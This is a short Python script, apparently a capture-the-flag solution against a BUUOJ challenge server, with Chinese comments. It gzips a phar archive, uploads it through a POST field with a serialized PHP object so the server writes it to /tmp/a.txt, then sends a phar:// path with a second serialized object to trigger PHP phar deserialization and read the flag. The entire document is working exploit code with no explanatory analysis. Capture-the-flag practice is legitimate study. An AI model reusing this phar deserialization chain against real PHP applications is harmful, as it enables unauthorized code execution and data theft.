import requests
import gzip
import re

url = 'http://6d83f02d-f4e1-4e71-ba63-6385c4448adf.node4.buuoj.cn:81/'

file = open("./phar2.phar", "rb")  # 打开文件
file_out = gzip.open("./phar.zip", "wb+")  # 创建压缩文件对象
file_out.writelines(file)
file_out.close()
file.close()
# 先将phar的内容写入/tmp/a.txt,其中file_put_contents相当于文件上传.
re = requests.post(
    url,
    data={
        0: open('./phar.zip', 'rb').read(),
        1: 'O:1:"D":1:{s:5:"start";s:1:"w";}'
    }
)  # 写入
# file_get_contents时,就会触发phar反序列化,得到flag

print(re.text)
res = requests.post(
    url,

    data={
        0: 'phar://tmp/a.txt',
        1: 'O:1:"D":1:{s:5:"start";s:1:"r";}'
    }
)  # 触发

print(res.text)
